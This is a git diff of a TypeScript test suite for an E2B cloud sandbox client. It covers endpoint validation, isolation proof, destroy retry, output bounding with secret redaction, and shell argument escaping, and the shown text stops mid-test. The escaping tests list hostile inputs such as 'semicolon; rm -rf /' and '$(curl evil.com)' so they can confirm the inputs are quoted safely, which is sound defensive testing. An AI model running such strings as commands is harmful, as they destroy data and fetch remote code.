@@ -8,6 +8,11 @@ import {
   MockE2bTransport,
   validateE2bConfig,
   loadE2bConfigFromEnv,
+  boundCombinedOutput,
+  createRealE2bTransport,
+  escapeShellArg,
+  buildShellCommandLine,
+  type E2bSdkSeam,
 } from '../../src/modules/agent/e2b-provider.js';
 import {
   IsolatedCloudSandboxAdapter,
@@ -225,50 +230,97 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
       }
     });
 
-    it('fails closed on invalid domain URL or non-HTTP(S) protocol', () => {
-      const res1 = validateE2bConfig({
+    it('fails closed on plain HTTP or unapproved endpoint domains (Blocker 3)', () => {
+      // Insecure plain HTTP must be rejected with SECURITY_VIOLATION
+      const httpRes = validateE2bConfig({
         enabled: true,
         apiKey: 'e2b_valid_key_123',
-        domain: 'ftp://not-allowed.com',
+        domain: 'http://api.e2b.dev',
       });
-      assert.equal(res1.valid, false);
+      assert.equal(httpRes.valid, false);
+      if (!httpRes.valid) {
+        assert.equal(httpRes.code, 'SECURITY_VIOLATION');
+        assert.match(httpRes.reason, /HTTPS is strictly required/i);
+      }
 
-      const res2 = validateE2bConfig({
+      // Arbitrary untrusted domain must be rejected with SECURITY_VIOLATION
+      for (const untrusted of ['https://evil.com', 'https://attacker.org', 'https://internal.corp']) {
+        const untrustedRes = validateE2bConfig({
+          enabled: true,
+          apiKey: 'e2b_valid_key_123',
+          domain: untrusted,
+        });
+        assert.equal(untrustedRes.valid, false);
+        if (!untrustedRes.valid) {
+          assert.equal(untrustedRes.code, 'SECURITY_VIOLATION');
+          assert.match(untrustedRes.reason, /Unapproved E2B endpoint host/i);
+        }
+      }
+
+      // Malformed URL must be rejected with INVALID_CONFIG
+      const malformedRes = validateE2bConfig({
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         domain: 'not a valid url at all',
       });
-      assert.equal(res2.valid, false);
+      assert.equal(malformedRes.valid, false);
+      if (!malformedRes.valid) {
+        assert.equal(malformedRes.code, 'INVALID_CONFIG');
+      }
+
+      // Approved *.e2b.dev HTTPS endpoints must pass
+      const approved1 = validateE2bConfig({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        domain: 'https://api.e2b.dev',
+      });
+      assert.equal(approved1.valid, true);
+
+      const approved2 = validateE2bConfig({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        domain: 'https://dedicated-cluster.e2b.dev',
+      });
+      assert.equal(approved2.valid, true);
     });
 
-    it('fails closed when transport is missing even if enabled and apiKey are provided', async () => {
-      const client = new E2bCloudSandboxProviderClient({
+    it('fails closed when networkIsolationGuaranteed is true but networkIsolationProof is missing (Blocker 3)', () => {
+      const res = validateE2bConfig({
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
-        // transport omitted!
+        // networkIsolationProof missing!
       });
-
-      await assert.rejects(
-        async () => {
-          await client.createSandbox({
-            workspaceId: dummyWorkspaceId,
-            ownerId: dummyOwnerId,
-            timeoutMs: 30_000,
-            networkPolicy: { egressEnabled: true, allowlist: [] },
-          });
-        },
-        (err: unknown) => {
-          assert.ok(err instanceof E2bProviderError);
-          assert.equal(err.code, 'INVALID_CONFIG');
-          return true;
-        }
-      );
+      assert.equal(res.valid, false);
+      if (!res.valid) {
+        assert.equal(res.code, 'INVALID_CONFIG');
+        assert.match(res.reason, /networkIsolationProof/i);
+      }
     });
   });
 
   // 4. Missing Network / Isolation Guarantee Tests
   describe('4. Missing network/isolation guarantee → fail closed', () => {
+    it('loadE2bConfigFromEnv does not trust raw boolean without auditable VPC proof (Blocker 3)', () => {
+      // Raw boolean alone must not satisfy isolation guarantee
+      const cfgRawBool = loadE2bConfigFromEnv({
+        GIGA_AGENT_E2B_ENABLED: 'true',
+        E2B_API_KEY: 'e2b_key',
+        E2B_NETWORK_ISOLATION_GUARANTEED: 'true',
+      });
+      assert.equal(cfgRawBool.networkIsolationGuaranteed, false);
+      assert.equal(cfgRawBool.networkIsolationProof, undefined);
+
+      // Auditable VPC gateway ID + verified firewall flag satisfies proof
+      const cfgVerified = loadE2bConfigFromEnv({
+        GIGA_AGENT_E2B_ENABLED: 'true',
+        E2B_API_KEY: 'e2b_key',
+        E2B_VPC_GATEWAY_ID: 'vpc-gw-ap-southeast-1',
+        E2B_EGRESS_FIREWALL_VERIFIED: 'true',
+      });
+      assert.equal(cfgVerified.networkIsolationGuaranteed, true);
+      assert.equal(cfgVerified.networkIsolationProof, 'vpc-gw-ap-southeast-1');
+    });
     it('fails closed when egressEnabled is false and networkIsolationGuaranteed is not true', async () => {
       const transport = new MockE2bTransport();
       const client = new E2bCloudSandboxProviderClient({
@@ -330,6 +382,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -373,6 +426,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
           enabled: true,
           apiKey: 'e2b_valid_key_123',
           networkIsolationGuaranteed: true,
+          networkIsolationProof: 'vpc-gw-proof-verified',
           transport,
         });
 
@@ -407,6 +461,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         template: 'custom-node-20',
         domain: 'https://api.e2b.dev',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -439,6 +494,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -475,6 +531,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -534,6 +591,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -564,6 +622,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -601,6 +660,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -616,7 +676,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
 
       assert.equal(transport.killedCount, 1);
       assert.equal(client.activeSandboxCount, 0);
-      assert.equal(client.getSandboxStatus(sandboxId), 'unknown');
+      assert.equal(client.getSandboxStatus(sandboxId), 'destroyed');
 
       // Subsequent calls on destroyed sandbox fail closed with SANDBOX_NOT_FOUND
       await assert.rejects(
@@ -640,6 +700,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -659,6 +720,58 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
       assert.equal(transport.killedCount, 1);
       assert.equal(client.activeSandboxCount, 0);
     });
+
+    it('failed destroy retains sandbox entry and status so retry can successfully destroy without false success (Blocker 2)', async () => {
+      const transport = new MockE2bTransport();
+      transport.failKillAttempts = 1; // First kill will fail with simulated network error
+
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      assert.equal(client.activeSandboxCount, 1);
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+
+      // Attempt 1: fails
+      await assert.rejects(
+        async () => {
+          await client.destroySandbox(sandboxId);
+        },
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'PROVIDER_ERROR');
+          assert.match(err.message, /Failed to destroy E2B sandbox/i);
+          return true;
+        }
+      );
+
+      // Invariant: sandbox was NOT marked destroyed, NOT removed from registry!
+      assert.equal(client.activeSandboxCount, 1);
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+      assert.equal(transport.killedCount, 0);
+
+      // Attempt 2 (Retry): succeeds!
+      await client.destroySandbox(sandboxId);
+
+      assert.equal(transport.killedCount, 1);
+      assert.equal(client.activeSandboxCount, 0);
+      assert.equal(client.getSandboxStatus(sandboxId), 'destroyed');
+
+      // Subsequent call is idempotent
+      await client.destroySandbox(sandboxId);
+      assert.equal(transport.killedCount, 1);
+    });
   });
 
   // 12. Timeout Tests
@@ -671,6 +784,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         defaultTimeoutMs: 20,
         transport,
       });
@@ -706,6 +820,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -743,6 +858,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -775,6 +891,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         defaultTimeoutMs: 25,
         transport,
       });
@@ -839,7 +956,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         async claimRun() {
           return {
             run: fakeRun,
-            workerId: 'test-worker-1',
+            workerId: 'worker-1',
             leaseToken: 'token-123',
             attemptCount: 1,
             leaseExpiresAt: new Date(Date.now() + 100).toISOString(),
@@ -861,7 +978,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
             event: {
               sequence: 1,
               type: 'run.failed' as const,
-              data: { runId: fakeRun.id, code: 'TIMEOUT', message: 'failed' },
+              data: { runId: fakeRun.id, code: 'WORKER_LEASE_EXPIRED', message: 'Worker lease expired' },
             },
           };
         },
@@ -897,6 +1014,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         maxOutputBytes: 80, // Very small byte bound
         transport,
       });
@@ -916,6 +1034,83 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
       assert.ok(readRes.bytes <= 80);
       assert.ok(Buffer.byteLength(readRes.content, 'utf8') <= 80);
     });
+
+    it('enforces one shared UTF-8 byte budget across both stdout and stderr combined in executeCommand (Blocker 4)', async () => {
+      const transport = new MockE2bTransport();
+      // Configure mock transport to return huge stdout (40 KiB) and huge stderr (40 KiB)
+      transport.createSandbox = async (opts) => {
+        const handle = await MockE2bTransport.prototype.createSandbox.call(transport, opts);
+        handle.commands.run = async () => ({
+          exitCode: 0,
+          stdout: 'A'.repeat(40_000),
+          stderr: 'B'.repeat(40_000),
+        });
+        return handle;
+      };
+
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        maxOutputBytes: 1024, // 1 KiB combined budget
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const res = await client.executeCommand(sandboxId, { command: 'heavy-output' });
+
+      const stdoutBytes = Buffer.byteLength(res.stdout, 'utf8');
+      const stderrBytes = Buffer.byteLength(res.stderr, 'utf8');
+      const combinedBytes = stdoutBytes + stderrBytes;
+
+      assert.ok(
+        combinedBytes <= 1024,
+        `Expected combined output <= 1024 bytes, got ${combinedBytes} (stdout=${stdoutBytes}, stderr=${stderrBytes})`
+      );
+      assert.ok(res.stdout.includes('[OUTPUT_TRUNCATED]'));
+      assert.ok(res.stderr.includes('[OUTPUT_TRUNCATED]'));
+    });
+
+    it('boundCombinedOutput allocates shared budget fairly and redacts secrets after truncation (Blocker 4)', () => {
+      // 1. Both large: evenly bounded, sum <= 200
+      const bothLarge = boundCombinedOutput('S'.repeat(500), 'E'.repeat(500), 200);
+      assert.ok(Buffer.byteLength(bothLarge.stdout, 'utf8') + Buffer.byteLength(bothLarge.stderr, 'utf8') <= 200);
+      assert.ok(bothLarge.stdout.includes('[OUTPUT_TRUNCATED]'));
+      assert.ok(bothLarge.stderr.includes('[OUTPUT_TRUNCATED]'));
+
+      // 2. Small stdout, large stderr: stdout preserved, stderr gets remainder
+      const smallStdout = boundCombinedOutput('Short stdout line', 'E'.repeat(1000), 200);
+      assert.equal(smallStdout.stdout, 'Short stdout line');
+      assert.ok(smallStdout.stderr.includes('[OUTPUT_TRUNCATED]'));
+      assert.ok(Buffer.byteLength(smallStdout.stdout, 'utf8') + Buffer.byteLength(smallStdout.stderr, 'utf8') <= 200);
+
+      // 3. Large stdout, small stderr: stderr preserved, stdout gets remainder
+      const smallStderr = boundCombinedOutput('S'.repeat(1000), 'Short error line', 200);
+      assert.equal(smallStderr.stderr, 'Short error line');
+      assert.ok(smallStderr.stdout.includes('[OUTPUT_TRUNCATED]'));
+      assert.ok(Buffer.byteLength(smallStderr.stdout, 'utf8') + Buffer.byteLength(smallStderr.stderr, 'utf8') <= 200);
+
+      // 4. Redaction preserved with Bearer token and e2b_ key in truncated output
+      const sensitiveOutput = boundCombinedOutput(
+        'Secret Authorization: Bearer abcdef1234567890abcdef ' + 'X'.repeat(500),
+        'Token e2b_9876543210fedcba ' + 'Y'.repeat(500),
+        250
+      );
+      assert.ok(!sensitiveOutput.stdout.includes('abcdef1234567890abcdef'));
+      assert.ok(!sensitiveOutput.stderr.includes('9876543210fedcba'));
+      assert.ok(sensitiveOutput.stdout.includes('[REDACTED]'));
+      assert.ok(sensitiveOutput.stderr.includes('[REDACTED_KEY]'));
+      assert.ok(
+        Buffer.byteLength(sensitiveOutput.stdout, 'utf8') + Buffer.byteLength(sensitiveOutput.stderr, 'utf8') <= 250
+      );
+    });
   });
 
   // 18. Secret Redaction Tests
@@ -926,6 +1121,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_1234567890abcdef',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -977,6 +1173,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -1006,6 +1203,7 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
         enabled: true,
         apiKey: 'e2b_valid_key_123',
         networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
         transport,
       });
 
@@ -1065,6 +1263,885 @@ describe('E2B Cloud Sandbox Provider Client (17T-69)', () => {
       assert.equal(typeof providerClient.listFiles, 'function');
       assert.equal(typeof providerClient.createSnapshot, 'function');
       assert.equal(typeof providerClient.destroySandbox, 'function');
+    });
+  });
+
+  // 22. Real E2B SDK Transport Mapping Tests (Blocker 1)
+  describe('22. Real E2B SDK transport mapping (Blocker 1)', () => {
+    it('createRealE2bTransport correctly maps lifecycle, commands, files, and kill to injected SDK seam', async () => {
+      let createdTemplate: string | undefined;
+      let createdOpts: any;
+      let commandRunArgs: { cmd: string; opts?: any } | undefined;
+      let fileReadPath: string | undefined;
+      let fileWriteArgs: { path: string; data: string } | undefined;
+      let fileListPath: string | undefined;
+      let killCalled = false;
+
+      const mockSdkInstance = {
+        sandboxId: 'e2b-real-sdk-sbx-999',
+        commands: {
+          async run(cmd: string, opts?: any) {
+            commandRunArgs = { cmd, opts };
+            return {
+              exitCode: 0,
+              stdout: 'SDK stdout result',
+              stderr: '',
+              error: undefined,
+            };
+          },
+        },
+        files: {
+          async read(path: string) {
+            fileReadPath = path;
+            return 'SDK file content from MicroVM';
+          },
+          async write(path: string, data: string) {
+            fileWriteArgs = { path, data };
+          },
+          async list(path: string) {
+            fileListPath = path;
+            return [
+              { name: 'app.ts', path: 'src/app.ts', type: 'file', size: 120 },
+              { name: 'assets', path: 'assets', type: 'directory' },
+            ];
+          },
+        },
+        async kill() {
+          killCalled = true;
+        },
+      };
+
+      const mockSdkSeam: E2bSdkSeam = {
+        Sandbox: {
+          async create(template?: string, opts?: any) {
+            createdTemplate = template;
+            createdOpts = opts;
+            return mockSdkInstance;
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(mockSdkSeam);
+      const handle = await transport.createSandbox({
+        apiKey: 'e2b_5555555555555555',
+        template: 'custom-node-22',
+        domain: 'https://dedicated.e2b.dev',
+        timeoutMs: 45_000,
+        envs: { FOO: 'bar' },
+        metadata: { workspaceId: dummyWorkspaceId, ownerId: dummyOwnerId },
+      });
+
+      assert.equal(handle.sandboxId, 'e2b-real-sdk-sbx-999');
+      assert.equal(createdTemplate, 'custom-node-22');
+      assert.equal(createdOpts.apiKey, 'e2b_5555555555555555');
+      assert.equal(createdOpts.domain, 'https://dedicated.e2b.dev');
+      assert.equal(createdOpts.timeoutMs, 45_000);
+      assert.deepEqual(createdOpts.envs, { FOO: 'bar' });
+      assert.deepEqual(createdOpts.metadata, { workspaceId: dummyWorkspaceId, ownerId: dummyOwnerId });
+
+      // Run command mapping
+      const cmdResult = await handle.commands.run('npm test', { cwd: '/app', envs: { CI: 'true' } });
+      assert.equal(cmdResult.exitCode, 0);
+      assert.equal(cmdResult.stdout, 'SDK stdout result');
+      assert.equal(commandRunArgs?.cmd, 'npm test');
+      assert.equal(commandRunArgs?.opts?.cwd, '/app');
+      assert.deepEqual(commandRunArgs?.opts?.envs, { CI: 'true' });
+
+      // File operations mapping
+      const readContent = await handle.files.read('src/app.ts');
+      assert.equal(readContent, 'SDK file content from MicroVM');
+      assert.equal(fileReadPath, 'src/app.ts');
+
+      await handle.files.write('output.json', '{"status":"ok"}');
+      assert.deepEqual(fileWriteArgs, { path: 'output.json', data: '{"status":"ok"}' });
+
+      const entries = await handle.files.list('src');
+      assert.equal(fileListPath, 'src');
+      assert.equal(entries.length, 2);
+      assert.equal(entries[0]?.name, 'app.ts');
+
+      // Kill mapping
+      assert.equal(handle.isOpen?.(), true);
+      await handle.kill();
+      assert.equal(killCalled, true);
+      assert.equal(handle.isOpen?.(), false);
+    });
+
+    it('E2bCloudSandboxProviderClient defaults to createRealE2bTransport when transport is omitted', async () => {
+      // Create client with transport omitted
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-test-001',
+        // transport: undefined -> defaults to createRealE2bTransport()
+      });
+
+      assert.equal(client.isEnabled, true);
+      assert.equal(client.isConfigured, true);
+      assert.equal(client.providerName, 'e2b');
+    });
+  });
+
+  // 23. Command Argument Escaping & Injection Fencing (P1 Finding)
+  describe('23. Command argument escaping and shell injection fencing (P1 Finding)', () => {
+    it('escapeShellArg wraps in single quotes and escapes single quotes cleanly', () => {
+      // Basic words
+      assert.equal(escapeShellArg('hello'), "'hello'");
+      assert.equal(escapeShellArg(''), "''");
+
+      // Spaces
+      assert.equal(escapeShellArg('hello world'), "'hello world'");
+
+      // Single quotes
+      assert.equal(escapeShellArg("it's"), "'it'\\''s'");
+      assert.equal(escapeShellArg("foo'bar'baz"), "'foo'\\''bar'\\''baz'");
+
+      // Double quotes
+      assert.equal(escapeShellArg('"quoted"'), '\'"quoted"\'');
+
+      // Metacharacters: semicolons, pipes, ampersands, redirections
+      assert.equal(escapeShellArg('foo; rm -rf /'), "'foo; rm -rf /'");
+      assert.equal(escapeShellArg('a | b && c || d > e < f &'), "'a | b && c || d > e < f &'");
+
+      // Shell expansions: variables and command substitution
+      assert.equal(escapeShellArg('$HOME'), "'$HOME'");
+      assert.equal(escapeShellArg('${USER}'), "'${USER}'");
+      assert.equal(escapeShellArg('$(whoami)'), "'$(whoami)'");
+      assert.equal(escapeShellArg('`id`'), "'`id`'");
+
+      // Newlines and backslashes
+      assert.equal(escapeShellArg('line1\nline2'), "'line1\nline2'");
+      assert.equal(escapeShellArg('C:\\path\\file'), "'C:\\path\\file'");
+    });
+
+    it('buildShellCommandLine escapes arguments exactly once without duplicating or pre-concatenating', () => {
+      // No arguments
+      assert.equal(buildShellCommandLine('git status'), 'git status');
+      assert.equal(buildShellCommandLine('ls -la'), 'ls -la');
+      assert.equal(buildShellCommandLine('echo', []), 'echo');
+
+      // Multiple arguments
+      assert.equal(
+        buildShellCommandLine('git', ['commit', '-m', 'Initial commit']),
+        "git 'commit' '-m' 'Initial commit'"
+      );
+
+      // Arguments with quotes and spaces
+      assert.equal(
+        buildShellCommandLine('echo', ["it's a test", '"quoted"']),
+        "echo 'it'\\''s a test' '\"quoted\"'"
+      );
+    });
+
+    it('executeCommand and real transport pass arguments cleanly to SDK seam exactly once without duplication or injection', async () => {
+      const capturedCommands: string[] = [];
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-args-test',
+              commands: {
+                async run(cmd: string) {
+                  capturedCommands.push(cmd);
+                  return {
+                    exitCode: 0,
+                    stdout: 'Command executed successfully',
+                    stderr: '',
+                    error: undefined,
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {},
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      // 1. Command with no arguments
+      await client.executeCommand(sandboxId, { command: 'node -v' });
+      assert.equal(capturedCommands[0], 'node -v');
+
+      // 2. Multiple arguments passed exactly once (not duplicated!)
+      await client.executeCommand(sandboxId, {
+        command: 'git',
+        args: ['commit', '-m', 'feat: initial setup', '--author', 'Alice <alice@test.dev>'],
+      });
+      assert.equal(
+        capturedCommands[1],
+        "git 'commit' '-m' 'feat: initial setup' '--author' 'Alice <alice@test.dev>'"
+      );
+      // Verify no argument duplication: "commit" appears once, not "git commit -m ... 'commit' '-m' ..."
+      const occurrences = (capturedCommands[1]?.match(/commit/g) || []).length;
+      assert.equal(occurrences, 1);
+
+      // 3. Arguments containing spaces, single quotes, double quotes, semicolons, command substitutions
+      const maliciousArgs = [
+        'normal-arg',
+        'with spaces',
+        "single'quote",
+        'double"quote',
+        'semicolon; rm -rf /',
+        '$(curl evil.com)',
+        '`whoami`',
+        '$SECRET_ENV',
+        'pipe | cat',
+        'ampersand & exit',
+      ];
+
+      await client.executeCommand(sandboxId, {
+        command: 'run_tool',
+        args: maliciousArgs,
+      });
+
+      assert.equal(
+        capturedCommands[2],
+        "run_tool 'normal-arg' 'with spaces' 'single'\\''quote' 'double\"quote' 'semicolon; rm -rf /' '$(curl evil.com)' '`whoami`' '$SECRET_ENV' 'pipe | cat' 'ampersand & exit'"
+      );
+
+      // Verify the malicious command is safely enclosed in single quotes as data
+      assert.ok(capturedCommands[2]?.includes("'semicolon; rm -rf /'"));
+      assert.ok(capturedCommands[2]?.includes("'$(curl evil.com)'"));
+      assert.ok(capturedCommands[2]?.includes("'`whoami`'"));
+      assert.ok(capturedCommands[2]?.includes("'$SECRET_ENV'"));
+    });
+  });
+
+  // 24. In-Flight Command Cancellation for Real Transport (P1 Finding)
+  describe('24. In-flight command cancellation for real transport (P1 Finding)', () => {
+    it('cancels in-flight remote command via SDK handle.kill() without terminating sandbox', async () => {
+      let handleKillCalled = false;
+      let sandboxKillCalled = false;
+      let waitResolve: ((res: any) => void) | undefined;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-cancel-test',
+              commands: {
+                async run() {
+                  return {
+                    pid: 4321,
+                    async wait() {
+                      return new Promise((resolve) => {
+                        waitResolve = resolve;
+                      });
+                    },
+                    async kill() {
+                      handleKillCalled = true;
+                      if (waitResolve) {
+                        waitResolve({
+                          exitCode: 137,
+                          stdout: '',
+                          stderr: 'Killed by SIGKILL',
+                          error: 'Killed by SIGKILL',
+                        });
+                      }
+                      return true;
+                    },
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillCalled = true;
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      // Launch command asynchronously
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'sleep 30',
+        signal: ac.signal,
+      });
+
+      // Give event loop a cycle so command starts and enters wait()
+      await new Promise((r) => setImmediate(r));
+
+      // Trigger in-flight cancellation
+      ac.abort();
+
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+
+      // Verify handle.kill() was called to terminate the remote process
+      assert.equal(handleKillCalled, true);
+      // Since individual command kill succeeded, sandbox VM itself was NOT killed
+      assert.equal(sandboxKillCalled, false);
+      assert.equal(client.getSandboxStatus(sandboxId), 'active');
+    });
+
+    it('falls back to terminating sandbox when individual command cancellation fails or is unsupported', async () => {
+      let sandboxKillCalled = false;
+
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-fallback-cancel',
+              commands: {
+                async run() {
+                  return {
+                    pid: 9999,
+                    async wait() {
+                      return new Promise(() => {
+                        // Never resolves naturally
+                      });
+                    },
+                    async kill() {
+                      // Simulate failure to cancel individual command
+                      throw new Error('RPC error: process kill failed');
+                    },
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {
+                sandboxKillCalled = true;
+              },
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
+      const client = new E2bCloudSandboxProviderClient({
+        enabled: true,
+        apiKey: 'e2b_valid_key_123',
+        networkIsolationGuaranteed: true,
+        networkIsolationProof: 'vpc-gw-proof-verified',
+        transport,
+      });
+
+      const { sandboxId } = await client.createSandbox({
+        workspaceId: dummyWorkspaceId,
+        ownerId: dummyOwnerId,
+        timeoutMs: 30_000,
+        networkPolicy: { egressEnabled: true, allowlist: [] },
+      });
+
+      const ac = new AbortController();
+
+      const execPromise = client.executeCommand(sandboxId, {
+        command: 'hanging-binary',
+        signal: ac.signal,
+      });
+
+      await new Promise((r) => setImmediate(r));
+
+      // Trigger abort while running
+      ac.abort();
+
+      await assert.rejects(
+        execPromise,
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'EXECUTION_ABORTED');
+          return true;
+        }
+      );
+
+      // Verify fallback was triggered: sandbox was terminated to guarantee process stops!
+      assert.equal(sandboxKillCalled, true);
+
+      // Verify subsequent commands fail closed because sandbox was terminated
+      await assert.rejects(
+        client.executeCommand(sandboxId, { command: 'echo 1' }),
+        (err: unknown) => {
+          assert.ok(err instanceof E2bProviderError);
+          assert.equal(err.code, 'PROVIDER_ERROR');
+          assert.match(err.message, /terminated/i);
+          return true;
+        }
+      );
+    });
+
+    it('ensures cancellation race cannot return stale success if remote completes concurrently with abort', async () => {
+      const seam: E2bSdkSeam = {
+        Sandbox: {
+          async create() {
+            return {
+              sandboxId: 'e2b-sbx-race-test',
+              commands: {
+                async run() {
+                  return {
+                    pid: 1234,
+                    async wait() {
+                      // Resolves successfully
+                      return {
+                        exitCode: 0,
+                        stdout: 'SUCCESS RESULT SHOULD BE DISCARDED',
+                        stderr: '',
+                      };
+                    },
+                    async kill() { return true; },
+                  };
+                },
+              },
+              files: {
+                async read() { return ''; },
+                async write() {},
+                async list() { return []; },
+              },
+              async kill() {},
+            };
+          },
+        },
+      };
+
+      const transport = createRealE2bTransport(seam);
